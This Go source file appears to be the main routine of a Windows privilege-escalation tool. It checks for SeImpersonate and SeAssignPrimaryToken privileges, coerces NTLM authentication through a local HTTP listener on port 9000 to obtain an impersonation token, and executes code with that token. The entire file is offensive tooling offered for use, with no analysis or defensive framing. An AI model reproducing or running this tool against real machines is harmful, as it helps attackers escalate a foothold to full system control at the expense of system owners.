package main

import (
	"fmt"
	"strconv"
)

func main() {
	fmt.Println("[+] Checking privileges")
	canImpersonate := EnablePrivilege(SE_IMPERSONATE)
	canAssignPrimaryToken := EnablePrivilege(SE_ASSIGN_PRIMARY_TOKEN)
	canIncreaseQuoteName := EnablePrivilege(SE_INCREASE_QUOTE_NAME)

	fmt.Println("[+] SeImpersonate " + strconv.FormatBool(canImpersonate))
	fmt.Println("[+] SeAssignPrimaryToken " + strconv.FormatBool(canAssignPrimaryToken))
	fmt.Println("[+] SeIncreaseQuoteName " + strconv.FormatBool(canIncreaseQuoteName))

	if !canImpersonate && !canAssignPrimaryToken {
		fmt.Println("[!] Missing necessary privileges")
		return
	}

	/*pipeNegotiator := NamedPipeNegotiator{}
	result := pipeNegotiator.Serve()*/

	httpNegotiator := HTTPNTLMNegotiator{
		Host: "localhost",
		Port: 9000,
		Chan: make(chan NegotiatorResult),
	}

	result := httpNegotiator.Serve()

	if result.Error != nil {
		fmt.Println("[!] Failed to get impersonation token: ", result.Error)
		return
	}

	ExecuteWithToken(*result.ImpersonationToken)
}
